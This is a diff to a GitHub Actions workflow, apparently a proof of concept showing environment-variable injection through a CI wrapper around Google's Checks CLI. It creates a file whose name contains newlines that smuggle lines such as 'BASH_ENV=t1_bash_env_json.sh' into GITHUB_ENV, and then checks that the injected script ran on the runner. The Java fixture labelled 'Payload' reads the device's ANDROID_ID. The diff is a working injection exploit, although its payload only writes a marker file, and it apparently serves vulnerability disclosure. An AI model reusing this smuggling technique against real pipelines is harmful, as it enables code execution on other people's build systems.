@@ -92,3 +92,98 @@ jobs:
           test -f t1_bash_env_marker.txt
           cat t1_bash_env_marker.txt
           printf 'T1_GITHUB_ENV_BASH_ENV_RESULT=executed\n'
+
+  json-wrapper-env-injection:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Prepare Checks JSON fixture
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf scan-root-json
+          mkdir -p scan-root-json
+          python3 - <<'PY'
+          from pathlib import Path
+
+          source = """\
+          import android.provider.Settings;
+
+          class Payload {
+            void leak(android.content.ContentResolver cr) {
+              String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
+              String marker = "T1_JSON_ENV_WRAPPER_20260605";
+            }
+          }
+          """
+          Path("scan-root-json/Control.java").write_text(source)
+          name = (
+              "JsonEnvProbe\n"
+              "T1_JSON_ENV_ACCEPTED=T1_JSON_ENV_TOLERANCE_20260605\n"
+              "BASH_ENV=t1_bash_env_json.sh\n"
+              "DUMMY=tail.java"
+          )
+          Path("scan-root-json", name).write_text(source)
+          Path("t1_bash_env_json.sh").write_text(
+              "printf 'T1_JSON_BASH_ENV_EXECUTED_20260605\\n' > t1_json_bash_env_marker.txt\\n"
+          )
+          PY
+          find scan-root-json -maxdepth 1 -type f -printf 'fixture-file=%p\n'
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Bad wrapper writes extracted JSON filename into GITHUB_ENV
+        shell: bash
+        run: |
+          set -euo pipefail
+          ./checks code scan scan-root-json \
+            --skip-upload \
+            --format=json \
+            --account-id=1 \
+            --repo-id=1 \
+            --scm-remote-url=https://github.com/cllc3993/checks-s1-ci-impact-poc \
+            --branch-name=t1-json-env-wrapper \
+            --scm-revision="T1_JSON_ENV_WRAPPER_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
+            --disable-analytics \
+            --disable-version-check \
+            --no-input > checks.json
+          filename="$(
+            python3 - <<'PY'
+          import json
+          data = json.load(open("checks.json"))
+          for source in data["sources"]:
+              value = source.get("fileName", "")
+              if "JsonEnvProbe" in value:
+                  print(value, end="")
+                  break
+          PY
+          )"
+          printf 'extracted-filename-begin\n%s\nextracted-filename-end\n' "$filename"
+          printf 'CHECKS_FILE=%s\n' "$filename" >> "$GITHUB_ENV"
+          grep -n 'CHECKS_FILE\|T1_JSON_ENV_ACCEPTED\|BASH_ENV\|DUMMY=' "$GITHUB_ENV" || true
+
+      - name: Verify hosted runner applied JSON wrapper env lines
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf 'observed-T1_JSON_ENV_ACCEPTED=%s\n' "${T1_JSON_ENV_ACCEPTED-}"
+          test "${T1_JSON_ENV_ACCEPTED-}" = "T1_JSON_ENV_TOLERANCE_20260605"
+          printf 'T1_JSON_ENV_WRAPPER_RESULT=accepted\n'
+
+      - name: Verify JSON wrapper BASH_ENV startup effect
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf 'observed-BASH_ENV=%s\n' "${BASH_ENV-}"
+          test "${BASH_ENV-}" = "t1_bash_env_json.sh"
+          test -f t1_json_bash_env_marker.txt
+          cat t1_json_bash_env_marker.txt
+          printf 'T1_JSON_ENV_BASH_ENV_RESULT=executed\n'
